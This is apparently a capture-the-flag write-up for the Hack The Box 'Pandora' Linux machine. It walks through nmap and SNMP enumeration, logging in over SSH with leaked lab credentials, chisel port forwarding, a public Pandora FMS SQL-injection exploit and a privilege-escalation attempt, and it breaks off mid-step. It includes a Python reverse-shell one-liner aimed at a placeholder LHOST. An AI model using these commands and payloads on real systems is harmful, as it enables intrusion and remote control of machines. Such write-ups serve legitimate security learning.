# Box: Pandora
# Level: Easy
# OS: Linux
<hr>

Lets get started 

# Recon

## PortScanning

command:```sudo nmap -A 10.129.82.84 -v -p- -T4```

```
Nmap scan report for 10.129.82.84
Host is up (0.22s latency).
Not shown: 64939 closed tcp ports (reset), 594 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=11/5%OT=22%CT=1%CU=35086%PV=Y%DS=2%DC=I%G=Y%TM=6547DAF
OS:8%P=x86_64-pc-linux-gnu)SEQ()SEQ(SP=FE%GCD=1%ISR=107%TI=Z%TS=A)SEQ(SP=FE
OS:%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=
OS:M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE
OS:88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=N)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5
OS:3CNNSNW7%CC=Y%Q=)T1(R=N)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3
OS:(R=N)T4(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=N)T5(R=Y%DF
OS:=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z
OS:%F=R%O=%RD=0%Q=)T7(R=N)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R
OS:=N)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 995/tcp)
HOP RTT    ADDRESS
1   ... 30

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Nov  5 19:12:08 2023 -- 1 IP address (1 host up) scanned in 1953.74 seconds
```
From our nmap scan we have 2 open ports, port 22 which runs ssh and port 80 which runs the ssh service. Our enumeration today will be focused on port 80



# Enumeration

Navigate to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c905f057-10eb-493a-a56a-3b8a642bae9f)

So, this is an extension of the domain ```panda.htb```, lets add this domain name to our ```/etc/hosts``` file

Now, navigate to the domain ```panda.htb```

Didn't fimd anything interesting when I went through this webpage.

So I ran a UDP scan,

command:```nmap -sU -v 10.129.82.84```

```
Nmap scan report for panda.htb (10.129.82.84)
Host is up (0.27s latency).
Not shown: 905 closed udp ports (port-unreach), 94 open|filtered udp ports (no-response)
PORT    STATE SERVICE
161/udp open  snmp

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sun Nov  5 19:38:41 2023 -- 1 IP address (1 host up) scanned in 2524.15 seconds
```
From our scan we can see that there is a udp port open, port 161 which runs the snmp service. Lets enumerate this port



# Enumeration (Port 161/udp)

We'll be using a tool called ```snmpwalk``` for our enumeration

command:```snmpwalk -v1 -c public 10.129.63.75 > bankai.txt```

I'll be directing the output to a file ```bankai.txt``` so I can analyze it

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/pandora]
└─$ snmpwalk -v1 -c public 10.129.63.75 > bankai.txt    
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/pandora]
└─$ ls -la bankai.txt                                   
-rw-r--r-- 1 bl4ck4non bl4ck4non 369995 Nov  8 04:49 bankai.txt
```
Open the file with any text editor of your choice. Analyzing the results I found this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5c3a1aea-fecc-43c6-80ae-90afab12616c)

Found creds for a user daniel

Lets try to use this to ssh into the server

username:```daniel```        password:```HotelBabylon23```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f6fe2687-6b37-47c0-9e42-3777eb242677)

nice nice, we are logged in

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5992724a-4cc5-4839-af1c-3844b11966b4)

The user flag is in the matt directory and we currrently don't have enough privileges to access it. Lets go ahead to escalate our privileges




# Pivilege Escalation

In the ```/var/www/``` directory there's a directory ```pandora```  

Navigating to that directory

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3c2f0e8d-e62a-4ecc-9ad3-c796d2ddde70)

We can see a sub-directory ```pandora_console```, in this directory I read the ```index.php``` file, 

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c446658d-b62c-4703-8fc2-e6b24c93f654)

We can see the package name and the version, but we can't access this on our browser which means we have to do a little portforwarding

Lets transfer chisel over to the target machine

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f4c57f53-425a-49a1-b423-8b836be64308)

On the target machine run this

command:```./chisel client 10.10.14.30:9001 R:80:127.0.0.1:80```

On your machine run this

command:```./chisel server -p 9001 --reverse```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4eff3a5b-c196-4c89-bddf-8bc074e8c5e7)

Now lets navigate to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9d93b9c2-ef0b-4114-a918-045b2e4f5599)

nice nice, now we can view the webpage

At the end of the webpage you should be able to see the version of pandora fms

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b2cfba64-ed54-4750-aa82-58fd9008bfce)

So this has a version ```v7.0NG.742_FIX_PERL2020```, there is a public exploit for this version of pandora fms

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cb46140f-1ccd-4d42-ade9-2774d042dca6)

You can download the exploit [here](https://github.com/UNICORDev/exploit-CVE-2020-5844/blob/main/exploit-CVE-2020-5844.py)

Well, this exploit didn't work, reading the python file 

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6a6b15e7-3383-45c2-84fc-dbff118ea1b1)

It uses the creds ```nick``` and ```pass```, but this creds isn't working for this login page, hence why the exploit wasn't working

Doing further research, I found this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/bfd40e62-c9b9-4892-843f-4b3626c7a141)

You can download the exploit [here](https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated/blob/master/sqlpwn.py)

To run the exploit

command:```python sqlpwn.py -t 127.0.0.1```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/be1d9cda-5fec-4ad2-a2fe-716d9858ada4)

nice nice, this exploit worked, now lets spawn a reverse shell with this

payload:```python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("LHOST",LPORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'```

Ensure you edit the ```LHOST``` and ```LPORT```. 

Now we can use that payload to spawn a reverse shell

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/53a0b189-3f6b-45b5-ad74-151ebd320a5a)

Checking my netcat listener

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8b94ff3d-b1ad-4e73-9574-9b35c2b36d4f)

To stabilize the shell

commands
```
python3 -c “import pty;pty.spawn(‘/bin/bash’)”
ctrl + z (to background)
stty raw -echo && fg
export TERM=xterm
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1f7211f3-5253-4bb8-8644-d7bbd751f6a9)

Lets further escalate our privileges

Checking for SUID binaries, I found something interesting

command:```find / -perm -u=s -type f 2>/dev/null```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/40c56707-5ac7-4010-bf64-a403ccc5c7fe)

Lets check out the binary

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d47d4849-eb7c-4641-bc29-59dbba9e8815)

To analyze this binary well, I'll send it to my machine

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/09121a08-0a53-47e4-a762-5a0bb76a2b35)

Running strings on the binary

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fa35a26b-a266-43d5-9e73-07eb2eb38487)

We can see from the above screenshot that ```tar``` is the command-line utility being used to generate a backup in the form of a ```tar.gz``` form.

To exploit this, we'll hijack relative paths in this suid binary

I used this [blog](https://medium.com/r3d-buck3t/hijacking-relative-paths-in-suid-programs-fed804694e6e), to exploit this

So first


















































